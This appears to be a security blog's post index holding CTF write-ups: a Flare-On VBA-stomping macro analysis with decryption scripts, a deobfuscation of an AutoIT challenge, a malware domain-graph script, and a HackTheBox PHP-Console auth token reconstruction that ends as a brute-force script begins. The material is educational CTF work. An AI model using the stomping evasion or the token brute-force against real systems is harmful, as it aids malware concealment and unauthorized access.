the stage 1 will drop a file with .mp3 extension, and use the mciSendString function to “play” that song, now we need to get the F.T.Text value and understand how the decryption process in canoodle function works.The two faces of LThe function that decrypt the song is that:Function canoodle(panjandrum As String, ardylo As Integer, s As Long, bibble As Variant) As Byte()    Dim quean As Long    Dim cattywampus As Long    Dim kerfuffle() As Byte    ReDim kerfuffle(s)    quean = 0    For cattywampus = 1 To Len(panjandrum) Step 4        kerfuffle(quean) = CByte(\"&amp;H\" &amp; Mid(panjandrum, cattywampus + ardylo, 2)) Xor bibble(quean Mod (UBound(bibble) + 1))        quean = quean + 1        If quean = UBound(kerfuffle) Then            Exit For        End If    Next cattywampus    canoodle = kerfuffleEnd FunctionThis can be easily rewritten in Python as:def decrypt_stage(stage2, pos, key, length):\tdecrypted = []\tlen_key = len(key)\tkey_count = 0\tfor i in range(0, len(stage2), 4):\t\tbyte_at = int(stage2[i+pos:i+2+pos], base=16)\t\tb = byte_at ^ key[key_count % len_key]\t\t\t\tdecrypted.append(b)\t\tkey_count += 1\t\tif key_count == length:\t\t\tbreak\treturn bytes(decrypted)The idea here is, we get a text, a length and where in the string we should split, because this will be a text in the hex format, and we just will decrypt the first byte of this 2 bytes, example:b = \"C4BA\"b[0+pos:2] ^ key# C4This is also using a XOR encryption using an block cipher, so we need to always make sure to stay in the range, using mod.Decrypting the audioJust like before, I dumped the data using ssviewer, I edited the file to make it start at the 58 value, the start of L.Text(Look at the form again).Now, calling the function:key = b\"\\x11\\x22\\x33\\x44\\x55\\x66\\x77\\x88\\x99\\xAA\\xCC\\xDD\\xEE\"input_file = sys.argv[1]stage2_decrypted = open(input_file, \"r\").read().strip()size = \t168667decrypted_stage2 = decrypt_stage(stage2_decrypted, 0, key, size)    with open(\"stage2.dec\", \"wb\") as sfd:    print(decrypted_stage2[:4])    sfd.write(decrypted_stage2)I get this sound:The sound has only a random sounds, and the title is This is not what you should be looking at… and the Album title is P. Code.Let’s talk about the real thing hereOk, forget about almost everything above, the real thing is… that this code above is fake.VBA StompingAfter research a lot about P-Code, I discovered that VBA macros,  actually are compiled when the document is ready and not only hold the real code. The compiled code makes the run process faster if the person who open the document has the same VBA version.That “feature” can be used to inject malicious code inside the document and write a fake source file to trick analysts and anti virus solutions, if the document has the same VBA version as the attacker, this code will be executed and using that is possible to hide the real code, this technique is called VBA Stomping.We can dump the real P-Code with the amazing job created by Dr. Vesselin Bontchev the author of pcodedmp, using this we can read the original source code. The P-Code has a format that remember ASM, so in order to get the almost exactly code as the macro, I found this another cool tool based in pcodedmp, pcode2code.The code in P-CodeLet’s use pcodedmp and get the real code:$ pcode2code report.xls | tee real_code.vbsI will not dump the whole code again, because only certain things changed, the decrypt and decode table still the same, so we will use our previous work to get the flag.' Already decoded the strings looking at our decode tableSet groke = CreateObject(\"WScript.Network\")firkin = groke.UserDomainIf firkin &lt;&gt; \"FLARE-ON\" Then    MsgBox \"Sorry, this machine is not supported.\" vbCritical, \"Error\"    EndEnd Ifn = Len(firkin)For i = 1 To n    buff(n - i) = Asc(Mid$(firkin, i, 1))Nextwabbit = canoodle(F.T.Text, 2, 285729, buff)mf = Environ(\"AppData\" &amp; \"\\Microsoft\\v.png\")Open mf For Binary Lock Read Write As #fn' a generic exception occured at line 68: can only concatenate str (not \"NoneType\") to str'\t# Ld fn'\t# Sharp'\t# LitDefault'\t# Ld wabbit'\t# PutRecClose #fnSet panuding = Sheet1.Shapes.AddPicture(mf, False, True, 12, 22, 600, 310)What has changed here?  It get the hostname and check if is equal to FLARE-ON  The FLARE-ON name is reversed and its created an buff with their numbers values, in ascii  The byte used to decrypt is in the second position  The length of the output file is greater  The key is the reversed FLARE-ON stringVery cool, isn’t ?Finally, the real flagNow, its just a matter to adapt the script to decrypt for us:if __name__ == '__main__':\t# FLARE-ON\t# key = \"FLARE-ON\" \tkey = b\"\\x4e\\x4f\\x2d\\x45\\x52\\x41\\x4c\\x46\" # reversed\tinput_file = sys.argv[1]\tstage2_decrypted = open(input_file, \"r\").read().strip()\tsize = \t285730\tdecrypted_stage2 = decrypt_stage(stage2_decrypted, 2, key, size)\t\t\t\twith open(\"stage2.dec\", \"wb\") as sfd:\t\tprint(decrypted_stage2[:4])\t\tsfd.write(decrypted_stage2And then:The decrypted flag image isThat a very good example of this technique, I lost a lot of time just looking at the wrong place because I didn’t knew this about this technique, it’s very amazing how this works and a very clever evasion system, we see a lot anti virus solutions having trouble to analyze malicious scripts, can imagine how they will deal with a malicious code injected at the compiled code ?I recommend the following resources:  pcodedmp  stomp 2 dis  vbastomp  vba stomping by walmart"
  },
  
  {
    "title": "The Flare 7th AutoIT challenge",
    "url": "/posts/Code-it-flare-7/",
    "categories": "Reverse-Engineering",
    "tags": "ctf, Reverse engineering, Programming, Windows reversing, obfuscation analysis",
    "date": "2020-10-23 20:23:36 -0300",
    





    
    "snippet": "The 7th challenge of Flare-On CTF, give to us a QR code generator software that are fully obfuscated, the fun part of this challenge was interpret, analyse and deobfuscate core components of the so...",
    "content": "The 7th challenge of Flare-On CTF, give to us a QR code generator software that are fully obfuscated, the fun part of this challenge was interpret, analyse and deobfuscate core components of the software and then, make it give us the flag.Why this is useful ?Obfuscated scriptIn a real world scenario, malware using scripting language often came obfuscated and using a known languange, this challenge has a AutoIT software that are compressed and obfuscated, what makes the normal script analysis even harder.Encryption functions and Win32 callsThis challenge also explores how software often use Win32 functions by creating structs from the scripting interface, this can increase the power of the script engine even more. In this one, almost all Win32 api calls are from the WinCrypto, this shows to us how can some obfuscated malware can use the encryption functions from Windows for bad porpuse.Some kind of steganographyThis challenge also explores how can we hide messages in images like Bitmap using the LSB technique, with that the malware can literally have passwords or hidden commands in plain sight that are decoded in runtime.CTFCheck out, how this all behave:Message:Reverse engineer this little compiled script to figure out what you need to do to make it give you the flag (as a QR code).So, in this challenge we must understand how this QR code generator works and be able to make it replace the content with the flag.ReconBefore I even started this challenge, by the name Codeit I imagined that has something to do with AutoIT, and guess so ? It has everything to do with AutoIT.The file itself is compressed with UPX  file codeit.exe                                   codeit.exe: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressedBut, even this compressed file contain some data that indicate that we are dealing with an AutoIT compiled script,&gt;&gt; strings codeit.exe | grep AU3                    $pAU3H}AU3!EA06MAU3!EA06TAU3!… it’s like the magic number of compiled Autoit scripts, that has .au3 extension.RunningSo, the program works by receiving a text and creating a valid/authentic QR CodeThe first software has the initial screen and the second I put a word and generate a QR Code, the software I was using to read this images (that I printed) is qtqr.So, at first look the software only do that.AutoIT extractionThe au3 script inside the autoit executable are compressed in the resource section, together with all the project files itself, I will use AutoITExtractor to retrieve all files associated with this project.I extracted every piece of this project, sprite.bmp (The initial image), qr_encoder.dll a library that create qr codes, created by Nayuki and the script itself.The pain and the cure of obfuscationThe entire script is obfuscated, so it’s almost impossible to read without a little strugle, but let’s dig down into this obfuscation technique.The decode tableBefore the program logic even starts, there is a global decode table that are created, denoted by the variable $os, and the string values are encoded like:In order to pick all the program strings we just need to copy all this data and split by the word 4FD5$, I created a python decoder for that:The idea here it’s very simple, I just split the string and transformed this string in hex representation in his really value, that way I created the same table used by the script, and now I can see the real strings.Some of the strings are below:...decoded_table[24] = b'kernel32.dll'decoded_table[25] = b'int'decoded_table[26] = b'GetComputerNameA'decoded_table[27] = b'ptr'decoded_table[28] = b'CodeIt Plus!'decoded_table[29] = b'struct;byte['decoded_table[30] = b'];endstruct'decoded_table[31] = b'struct;byte[54];byte['decoded_table[32] = b'struct;ptr;ptr;dword;byte[32];endstruct'decoded_table[33] = b'advapi32.dll'decoded_table[34] = b'CryptAcquireContextA'decoded_table[35] = b'dword'decoded_table[36] = b'CryptCreateHash'decoded_table[37] = b'CryptHashData'decoded_table[38] = b'struct*'decoded_table[39] = b'CryptGetHashParam'decoded_table[40] = b'0x'decoded_table[41] = b'08020'decoded_table[42] = b'00010'decoded_table[43] = b'66000...But I don’t stopped there, I need to at least make the code readable.The obfuscator algorithmSo the way that obfuscator is:  It create a global decode table  Its created a bunch of variable to represente numbers  When some variable wants the string it will call the decode table with the index of the string  The value will be send to a function that will do the job of unhexlify functionExample:The function arehdidxrgk is the function that will decode the string, in this case, it’s looking at the position 4 in the decode table, obs: In autoit/vbs the index starts at 1, so in this case, it’s looking the value ‘biSize’.The deobfuscator algorithmSo, how I managed to defeat this obfuscation ? Doing all this at once!  Create a regex rule to found all the Number(“ \\d+ “) ocurrences  If it’s the number is lower than the size of my decode table I save the variable name with the value  Else I just hold the number value and the variable, because sometimes it wants just the number  Then replace all $os[] by the value itself.Deobfuscator codedef deobfuscate_content(content, decode_table):    index_rule = r'Number\\(\\\" \\d+ \\\"\\)'    number_table = re.finditer(index_rule, content)    decode_table_len = len(decode_table)    tokens = {}    # Find and classify tokens    for number in number_table:        real_number = int(number.group().split(\"\\\"\")[1])                if real_number != 0:            real_number -= 1                variable_name = content[number.start()-14:number.start()-3]                if real_number &gt;= decode_table_len:            tokens[variable_name] = {                'real_value': '',                'number': str(real_number+1),                'is_encoded': False            }            continue        real_value = decode_table[real_number]        tokens[variable_name] = {            'real_value': real_value.decode(),            'number': str(real_number+1),            'is_encoded': True        }    # Replace the values    for token, value in tokens.items():        if value['is_encoded']: # If has a value in decode_table            replace_var = \"$os[{}]\".format(token)            content = content.replace(replace_var, '\\\"{}\\\"'.format(value['real_value']))                content = content.replace(token, value['number'])    return content            The final code looks like:Now, let’s start the real challenge, this is far from finish.Windows crypto functionsYou already have noticed that has come calls to CryptAcquireContextA and CryptDecrypt, in order to AutoIT call this native functions it will use a special call called DllCall and the values must be created as an struct in memory with DllStructCreate, this structures holds the same memory representation as this function will received if was called by the native code.I recreated all this encryption part in C++, and it will be very easy to show what is happening here, because I already did all the dirty work to read each value in the struct passed and rebuild exactly the same call, if you don’t have windows SDK, you can follow all this using the wincrypt.h from wine,so let’s in parts:CryptAcquireContextA starts a new “encryption session” in Windows, using the handler we can access the crypto features, and this function must be called with the correct params that we want in our encryption.BOOL CryptAcquireContextA(  HCRYPTPROV *phProv,  LPCSTR     szContainer,  LPCSTR     szProvider,  DWORD      dwProvType,  DWORD      dwFlags);HCRYPTPROV cryptContext;if (CryptAcquireContext(&amp;cryptContext, NULL, NULL, PROV_RSA_AES, 4026531840)) {    ...}So this will start a session that will use AES for RSA keys.CryptCreateHash will start a new hash algorithm using the previous context, in this case:BOOL CryptCreateHash(  HCRYPTPROV hProv,  ALG_ID     Algid,  HCRYPTKEY  hKey,  DWORD      dwFlags,  HCRYPTHASH *phHash);HCRYPTHASH hash;CryptCreateHash(    cryptContext,    CALG_SHA_256, // 32780    NULL,    NULL,    &amp;hash);Now it will use CryptHashData to hash the data from flisilaylnraw variable (I will back in this names too) and will retrieve the results with CryptGetHashParam.BOOL CryptHashData(  HCRYPTHASH hHash,  const BYTE *pbData,  DWORD      dwDataLen,  DWORD      dwFlags);BOOL CryptGetHashParam(  HCRYPTHASH hHash,  DWORD      dwParam,  BYTE       *pbData,  DWORD      *pdwDataLen,  DWORD      dwFlags);if (CryptHashData(hash, input, size, NULL) &amp;&amp; CryptGetHashParam(hash, HP_HASHVAL, hashedData, &amp;hashSize, NULL)){    ...}Now, it will concat this value with another hex value: 0x08, 0x02, 0x00, 0x00, 0x10, 0x66, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00 + &lt;hashed_data&gt;This value, is actually a PUBLICKEYSTRUC that come when you export you created key by using CryptExportKey function.So, there is a bunch of encrypted data in this part, and the created key will be imported with CryptImportKey function and later this encrypted data will be decrypted by CryptDecrypt, if the decryption is sucessfully, our flag will be placed in our QRCode.BOOL CryptImportKey(  HCRYPTPROV hProv,  const BYTE *pbData,  DWORD      dwDataLen,  HCRYPTKEY  hPubKey,  DWORD      dwFlags,  HCRYPTKEY  *phKey);BOOL CryptDecrypt(  HCRYPTKEY  hKey,  HCRYPTHASH hHash,  BOOL       Final,  DWORD      dwFlags,  BYTE       *pbData,  DWORD      *pdwDataLen);So, I created an entire decrypt system based in this algorithm, but guess so ? It’s not the way to beat this challenge, but is fundamental to understand that part.The unused brute force functionbool decrypt(BYTE* candidate_password, int size){\tbool ok = false;\tHCRYPTPROV cryptContext;\tif (CryptAcquireContext(&amp;cryptContext, NULL, NULL, PROV_RSA_AES, 4026531840)) {\t\t/// Context ok\t\t// 32 bytes sha256 + public key header with 12 bytes\t\tBYTE key[KEY_SIZE] = { 0x08, 0x02, 0x00, 0x00, 0x10, 0x66, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, }; // Partial key\t\tBYTE encData[ENC_DATA_SIZE] = { 0xcd, 0x4b, 0x32, 0xc6, 0x50, 0xcf, 0x21, 0xbd, 0xa1, 0x84, 0xd8, 0x91, 0x3e, 0x6f, 0x92, 0xa, 0x37, 0xa4, 0xf3, 0x96, 0x37, 0x36, 0xc0, 0x42, 0xc4, 0x59, 0xea, 0x7, 0xb7, 0x9e, 0xa4, 0x43, 0xff, 0xd1, 0x89, 0x8b, 0xae, 0x49, 0xb1, 0x15, 0xf6, 0xcb, 0x1e, 0x2a, 0x7c, 0x1a, 0xb3, 0xc4, 0xc2, 0x56, 0x12, 0xa5, 0x19, 0x3, 0x5f, 0x18, 0xfb, 0x3b, 0x17, 0x52, 0x8b, 0x3a, 0xec, 0xaf, 0x3d, 0x48, 0xe, 0x98, 0xbf, 0x8a, 0x63, 0x5d, 0xaf, 0x97, 0x4e, 0x0, 0x13, 0x53, 0x5d, 0x23, 0x1e, 0x4b, 0x75, 0xb2, 0xc3, 0x8b, 0x80, 0x4c, 0x7a, 0xe4, 0xd2, 0x66, 0xa3, 0x7b, 0x36, 0xf2, 0xc5, 0x55, 0xbf, 0x3a, 0x9e, 0xa6, 0xa5, 0x8b, 0xc8, 0xf9, 0x6, 0xcc, 0x66, 0x5e, 0xae, 0x2c, 0xe6, 0xf, 0x2c, 0xde, 0x38, 0xfd, 0x30, 0x26, 0x9c, 0xc4, 0xce, 0x5b, 0xb0, 0x90, 0x47, 0x2f, 0xf9, 0xbd, 0x26, 0xf9, 0x11, 0x9b, 0x8c, 0x48, 0x4f, 0xe6, 0x9e, 0xb9, 0x34, 0xf4, 0x3f, 0xee, 0xde, 0xdc, 0xeb, 0xa7, 0x91, 0x46, 0x8, 0x19, 0xfb, 0x21, 0xf1, 0xf, 0x83, 0x2b, 0x2a, 0x5d, 0x4d, 0x77, 0x2d, 0xb1, 0x2c, 0x3b, 0xed, 0x94, 0x7f, 0x6f, 0x70, 0x6a, 0xe4, 0x41, 0x1a, 0x52, };\t\tPUBLICKEYSTRUC* pubstruct = (PUBLICKEYSTRUC*) key;\t\tstd::printf(\"Key type: 0x%x\\nAlg id: 0x%x\\n\", pubstruct-&gt;bType, pubstruct-&gt;aiKeyAlg);\t\tHCRYPTHASH hash;\t\tCryptCreateHash(\t\t\tcryptContext,\t\t\tCALG_SHA_256, // 32780\t\t\tNULL,\t\t\tNULL,\t\t\t&amp;hash);\t\t// Hash created\t\tconst BYTE* userinput = (const BYTE*)candidate_password;\t\tBYTE hashedData[32];\t\tDWORD hashSize;//\t\tputs(\"Hashing value...\");\t\tif (CryptHashData(hash, userinput, size, NULL) &amp;&amp; CryptGetHashParam(hash, HP_HASHVAL, hashedData, &amp;hashSize, NULL)){\t\t\t// sha256 hash//\t\t\tputs(\"Building the candidate private key...\");\t\t\tfor (auto i = 0; i &lt; hashSize; ++i) {\t\t\t\tkey[INITIAL_SIZE + i] = hashedData[i];\t\t\t}\t\t\t// Create \t\t\tHCRYPTPROV decryptContext;\t\t\tHCRYPTKEY privKey;\t\t\t//puts(\"Importing key...\");\t\t\tif (CryptAcquireContext(&amp;decryptContext, NULL, NULL, 24, 4026531840) &amp;&amp; CryptImportKey(decryptContext, key, KEY_SIZE, NULL, NULL, &amp;privKey)) {\t\t\t\tputs(\"[+] Key imported! [+]\\nStarting decryption...\");\t\t\t\tfor (auto i = 0; i &lt; KEY_SIZE; ++i) {\t\t\t\t\tprintf(\"%x\", key[i]);\t\t\t\t}\t\t\t\tDWORD data_len;\t\t\t\tif (CryptDecrypt(privKey, hash, NULL, TRUE, encData, &amp;data_len)) {\t\t\t\t\tputs(\"[+] Decrypted!! [+]\");\t\t\t\t\tprintf(\"Hex value: \");\t\t\t\t\tfor (auto i = 0; i &lt; ENC_DATA_SIZE; ++i) {\t\t\t\t\t\tprintf(\"%x\", encData[i]);\t\t\t\t\t}\t\t\t\t\tprintf(\"Char value: \");\t\t\t\t\tfor (auto i = 0; i &lt; ENC_DATA_SIZE; ++i) {\t\t\t\t\t\tprintf(\"%c\", encData[i]);\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\tprintf(\"Key used: \");\t\t\t\t\tfor (auto i = 0; i &lt; KEY_SIZE; ++i) {\t\t\t\t\t\tprintf(\"%x\", key[i]);\t\t\t\t\t}\t\t\t\t\tok = true;\t\t\t\t}\t\t\t\tprintf(\"\\n%d\\n\", GetLastError());\t\t\t\tCryptDestroyKey(privKey);\t\t\t\tCryptDestroyHash(hash);\t\t\t}\t\t}\t}\treturn ok;}The computer name functionLater on I realized that my input was never sent to the encryption part, but was another value, this value was my computer name that the script gets my calling GetComputerNameA function, then the name of my computer is passed to a function that will do a lot of operation up my computer name bytes and just after that, this decryption routine is called.obs: At this point I already renamed a lot of functions name, so it’s very clean righ nowSo, here my computer name is saved and then passed to a function that a called PrepareComputerNamePrepareComputerName functionThe key to beat this challenge is here, the script will load the sprite.bmp image and will see if it has some content after 54 bytes (After the bitmap header), and will start to loop in each of our computer name value and do the following steps:Inside bitmap loop  Read 6 bytes from the bitmap file  For each byte it will check if has a Least significant bit  If has, it will be shift left this bit by the loop number it are righ now  It will sum that to the current variable nameOut bitmap loop:  It will remove the LSB  Then will sum this value by 128 (1«7)What the **ck is this ? I don’t picke-up 100% of this encoding technique, but the important part is, the key is actually encoded here, if we just ignore the fact that we are increasing the computer name byte and just get the encoded value in the bitmap, we will be able to recover the key. Because this function guarante that if the computername is wrong it will be changed by the encode schema.I rewritten this routine to give us the key, and for better understanding:import sysimport hashlibsprite_content = open(\"sprite.bmp\", \"rb\").read()hostname = [ord(x) for x in sys.argv[1].lower()]sprite_content = sprite_content[54:] # Remove headerout = \"\"count = 0extracted = \"\"flag = []for i in range(len(hostname)):\tnumber_at = hostname[i]\treal_value = 0\tprint(\"Picking {} \".format(number_at))\tfor j in range(6, -1, -1):\t\tf = (sprite_content[count] &amp; 1) &lt;&lt; j\t\tprint(\"({} &amp; 1) &lt;&lt; {} = {}\".format(sprite_content[count], j, f))\t\tnumber_at += f\t\treal_value += f\t\tcount += 1\t\tflag.append(chr(real_value))\tprint(\"Result {}\".format(number_at))\t\t\tsum_lsb = (number_at &gt;&gt; 1) + ((number_at &amp; 1) &lt;&lt; 7)\tprint(\"Appling ({0} &gt;&gt; 1) + (({0} &amp; 1)) &lt;&lt; 7) = {1}\".format(number_at, sum_lsb))\tout += chr(sum_lsb)print(''.join(flag))print(out)print(' '.join([ hex(ord(o)) for o in out ]))print(len(out))If will run with any input and the bitmap, we will get the encoded value + the operation result value:python3 decode.py THISISAVERYGO                                                                                                                                      Picking 116 (255 &amp; 1) &lt;&lt; 6 = 64(255 &amp; 1) &lt;&lt; 5 = 32(254 &amp; 1) &lt;&lt; 4 = 0(254 &amp; 1) &lt;&lt; 3 = 0(254 &amp; 1) &lt;&lt; 2 = 0(254 &amp; 1) &lt;&lt; 1 = 0(255 &amp; 1) &lt;&lt; 0 = 1Result 213Appling (213 &gt;&gt; 1) + ((213 &amp; 1)) &lt;&lt; 7) = 234Picking 104 (255 &amp; 1) &lt;&lt; 6 = 64(255 &amp; 1) &lt;&lt; 5 = 32(255 &amp; 1) &lt;&lt; 4 = 16(254 &amp; 1) &lt;&lt; 3 = 0(255 &amp; 1) &lt;&lt; 2 = 4(254 &amp; 1) &lt;&lt; 1 = 0(255 &amp; 1) &lt;&lt; 0 = 1Result 221....aut01tfan1999êîîÑMóãëéÑYPT0xea 0xee 0xee 0xd1 0x4d 0xf3 0xe3 0xeb 0xe9 0xd1 0x59 0x50 0x5413The encoded value is aut01tfan1999 if we pass this value as the input of this function, it will get the same as output:...Result 114Appling (114 &gt;&gt; 1) + ((114 &amp; 1)) &lt;&lt; 7) = 57aut01tfan1999aut01tfan19990x61 0x75 0x74 0x30 0x31 0x74 0x66 0x61 0x6e 0x31 0x39 0x39 0x39Finally, the flagNice, we can now open the project in AutoIT editor and change the computer name or change our computer name and reboot.That one, was very hard to pick-up and I did a LOT of research in many topics, the resolution was far from what I was looking at the beginning, but still a very nice and amazing challenge!"
  },
  
  {
    "title": "Using bipartite Graphs to detect Malware campaigns",
    "url": "/posts/bipartite-graph-for-threats/",
    "categories": "Malware-Research",
    "tags": "Programming, Malware Research",
    "date": "2020-04-30 20:31:36 -0300",
    





    
    "snippet": "One of the greatest problems in mapping threats today, is detect from where it’s came, if is from the same group, same person or even from the same governament.In order to group everything up and m...",
    "content": "One of the greatest problems in mapping threats today, is detect from where it’s came, if is from the same group, same person or even from the same governament.In order to group everything up and make things more clear, we can use a lot of data structures for that, a good one, and very famous is a Graph, a Biptartite Graph more exactly.In order to acomplish that, I wrote a simple Python code to map all domains that is possible to find in a large dataset of PE files.This code was inspired in the Malware Data Science book, and uses an Bipartite Graph to build two sets, Domains and Samples, and the connect each one.Bipartite GraphBipartite graph is a graph where the vertices(nodes) can be splited in two groups and be connected to each other, that way, each vertice can have multiple connections to an specific set and can be used to determine how many nodes in a give group has an relation in another group.In this code, i extracted all samples strings of a given path, and applied a regex rule to extract possible domain names + loaded a valid domain suffixes list to create an valid dictionary to extract only correct domains from the samples.# Yep, i'm using strings herestrs = subprocess.check_output([\"strings\", abs_dir]).decode()hosts = extract_hostnames(strs, compiled_rule, valid_domains)if len(hosts) &gt; 0:    # Build graph    network.add_node(path, label=path[:32], color='black', penwidth=5, bipartite=0) # &lt;- This put our sample in set 1    for hostname in hosts:        network.add_node(hostname, label=hostname, color='blue', penwidth=10, bipartite=1) # &lt;- This put our hostname in set 2        network.add_edge(hostname, path)With that is possible to create an set of domains and a set of samples, and then connect each sample to a given domain and find which samples shares the same domain, thus, find and classify possible malware campaigns or a set of malware controlled by the same C2/group.Domain graph of APT1Executing$ pip install -r requirements.txt$ python mal_vis.py --target_path &lt;path_to_samples&gt;This will generate a DOT file that you can further import in any graphviz tool.Again, all thanks to Malware Data Science."
  },
  
  {
    "title": "Beating Console challenge from Hackthebox",
    "url": "/posts/Hacking-PHP-Console-Hackthebox/",
    "categories": "web-hacking",
    "tags": "ctf, Programming",
    "date": "2020-04-28 21:31:36 -0300",
    





    
    "snippet": "This challenge from hackthebox, give you an address with a running PHP application, when you open the web page, you will notice a phpinfo() page with:Your IP is 10.255.0.2 Make sure to load php-con...",
    "content": "This challenge from hackthebox, give you an address with a running PHP application, when you open the web page, you will notice a phpinfo() page with:Your IP is 10.255.0.2 Make sure to load php-console in order to be prompted for a passwordThe first thing that came in my mind, was to look for this php-console, probably in /php-console?some_rce_args=cat flag, but nop, it’s far to be so easy. So i searched for php-console keyword, and i came up in this very crazy library PHP-Console.PHP-ConsoleThis library allows you to debug the PHP code running through your browser, looks very weird and insecure, right? So, this PHP-Console has another client tool for chrome, it`s an extension that communicate to the PHP-Console server.Both libraries are open source which allows us to inspect the source code and try to find some vuln that we can explore or take advantage of. But let’s try to understand how the Auth works.Disclamer As a developer too, this tools looks very useful when you are developing something in PHP, and should not be deployed in production (obvious).Chrome ExtensionWhen you access the website now, you will see a key icon, that means that this PHP-Console is “protected”If you type anything inside this box, the page will be reloaded and nothing will happen. Now let’s analyze all the communication workflow with/without this extension.So, this is my request headers without the extension php-console:GET / HTTP/1.1Host: docker.hackthebox.eu:32741Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.163 Chrome/80.0.3987.163 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: php-console-server=5This is the response without the extension:HTTP/1.1 200 OKDate: Sat, 18 Apr 2020 18:11:40 GMTServer: Apache/2.4.38 (Debian)X-Powered-By: PHP/7.2.28Vary: Accept-EncodingContent-Encoding: gzipContent-Length: 10694Keep-Alive: timeout=5, max=99Connection: Keep-AliveContent-Type: text/html; charset=UTF-8Now take a look into my request with the extension:GET / HTTP/1.1Host: docker.hackthebox.eu:32741Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.163 Chrome/80.0.3987.163 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://docker.hackthebox.eu:32741/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjV9Response:HTTP/1.1 200 OKDate: Sat, 18 Apr 2020 18:11:47 GMTServer: Apache/2.4.38 (Debian)X-Powered-By: PHP/7.2.28PHP-Console-Postpone: {\"protocol\":5,\"isPostponed\":true,\"id\":\"8737403131977641650632750738\"}PHP-Console: {\"protocol\":5,\"auth\":{\"publicKey\":\"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e\",\"isSuccess\":false},\"docRoot\":null,\"sourcesBasePath\":null,\"getBackData\":null,\"isLocal\":null,\"isSslOnlyMode\":false,\"isEvalEnabled\":null,\"messages\":[]}Vary: Accept-EncodingContent-Encoding: gzipContent-Length: 10694Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/html; charset=UTF-8In our request, we have new cookies, php-console-server and php-console-client, php-console-server looks like the version of that addon and the php-console-client is base64 encoded. But before we decode that, let’s try some random password and see if the cookie itself changes.New cookie with random password:php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiZDhjMzkyM2FkMWI5ZjJmMmJlZTQ2MzE2ZjEwNDM5Y2M3MGNiYTNkNTIxNDg2YWE3NWIwMjYyMmM2NTNlMDVkMCJ9fQ==Good, now lets decode that and see what the extension is saving as a cookie:{\"php-console-client\":5,\"auth\":{\"publicKey\":\"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e\",\"token\":\"d8c3923ad1b9f2f2bee46316f10439cc70cba3d521486aa75b02622c653e05d0\"}}Ok, lets take a breath now, i took about 5-6 hours to beat this challenge, because the way the authentication works here is a bit crazy, the workflow is+--------------+                +--------------+               +---------------------------+|              |                |              |               |PHP-Console validate Cookie|| Get Password |                |Generate Token|  Post request |                           ||              +----------------+Set as Cookie +---------------&gt;                           ||              |                |              |               |                           ||              |                |              +&lt;--------------+                           |+--------------+                +--------------+               +---------------------------+Ok, now let’s dig inside the extension code, it’s easy because it’s an open source extension so we don’t need to dig into the source files in browser/unzip the extension :)I want to authenticate this, so the auth file is in js/auth.js, and there is a bunch of functions, but let’s focused in the good ones: getPasswordHash, getAuthToken.Password hash:function getPasswordHash(password) {\t\treturn window['CryptoJS']['SHA256'](password + 'NeverChangeIt:)').toString();}So the password hash, is a sha256 hash with a salt, the salt is NeverChangeIt:)Token generator:this.getAuthToken = function() {    if(this.hash &amp;&amp; this.publicKey) {        return window['CryptoJS']['SHA256'](this.hash + this.publicKey).toString();    }};And the token is, a sha256 hash with our passwordhash + publickeyGenerating our in Python&gt;&gt;&gt; import hashlib&gt;&gt;&gt; password=\"123456\"&gt;&gt;&gt; salt=\"NeverChangeIt:)\"&gt;&gt;&gt; password_hash = hashlib.sha256(password.encode()+salt.encode()).digest().hex()&gt;&gt;&gt; password_hash'd6b9942d933f39a7ffc037e0d7a590b588e69e2d150cc495b3ebad5b45b78e89'&gt;&gt;&gt; pub_key=\"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e\"&gt;&gt;&gt; token = hashlib.sha256(password_hash.encode()+pub_key.encode()).digest().hex()&gt;&gt;&gt; token'708a7032509aed6adf0556237b842491c0fe990c58b7bc66d36c30a6004c5b09'&gt;&gt;&gt; The public key is calculate based in our ip address(in this case, the hackthebox reverse proxy one), i will not enter in all details but you can take a look here in the php-console source code, it’s very simpleNow i will enter 123456 in the extension and see if i can get the same token, take a look at our request:Cookie: php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiNzA4YTcwMzI1MDlhZWQ2YWRmMDU1NjIzN2I4NDI0OTFjMGZlOTkwYzU4YjdiYzY2ZDM2YzMwYTYwMDRjNWIwOSJ9fQ==Decoding:{\"php-console-client\":5,\"auth\":{\"publicKey\":\"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e\",\"token\":\"708a7032509aed6adf0556237b842491c0fe990c58b7bc66d36c30a6004c5b09\"}}Good!! Now its possible to generate our custom brute force script :), i took a deep and long breath, made some coffe and started to code. And i came up with this php-console bruteforce script!import hashlibimport sysimport json,base64import requestsclass 